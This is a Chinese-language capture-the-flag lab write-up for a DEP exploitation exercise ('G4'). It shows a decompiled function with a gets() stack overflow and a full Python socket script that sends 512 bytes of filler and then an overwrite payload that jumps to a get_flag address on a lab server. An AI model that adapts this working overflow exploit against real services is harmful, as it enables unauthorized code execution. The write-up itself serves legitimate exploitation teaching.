# 系统层漏洞利用与逆向分析-DEP数据执行保护利用-G4 WriteUp

G4与之前所不同的主要在于vuln函数：

```c
void vuln(void)

{
  FILE *_File;
  char buff [128];
  
                    /* 0x1040  2  vuln */
  print(0x41d000);
  _File = (FILE *)open(0);
  _fread(&READ_ADDR,1,0x200,_File);
  print(0x41d008);
  gets(buff);
  return;
}
```

在读取缓冲区之前，程序首先会读取0x200(512)字节的数据。

所以payload的构造需要分为两部分，第一部分是读取的512字节数据，第二部分是缓冲区溢出漏洞利用。

此外，_File是库内部数据，并非局部变量，所以第二部分的填充大小仍为 128 + 4 字节而非 128 + 4 + 4 字节。

## 代码

```python
import socket
import struct

# 获取token的服务器地址，固定
TARGET_HOST = "172.17.43.31"
TARGET_PORT = 9999

GET_FLAG = 0x00401000 # get_flag函数地址
OFFSET = 128 + 4 # 栈偏移

def get_token():
    payload = b"A" * OFFSET
    payload += struct.pack("<I", GET_FLAG)
    payload += b"\n"

    with socket.create_connection((TARGET_HOST, TARGET_PORT), timeout=10) as sock:
        sock.settimeout(5)

        banner = sock.recv(1024)
        print(banner.decode(errors="replace"), end="") # Data :
        # 发送512字节填充数据
        sock.sendall(b"A"*511 + b"\n") 

        prompt = sock.recv(1024)
        print(prompt.decode(errors="replace"), end="") # Input :
        # 发送payload
        sock.sendall(payload) 

        response = b""
        while True:
            try:
                data = sock.recv(4096)
                if not data:
                    break
                response += data
            except socket.timeout:
                break

    text = response.decode(errors="replace")
    print(text)

    return text

if __name__ == "__main__":
    get_token()
```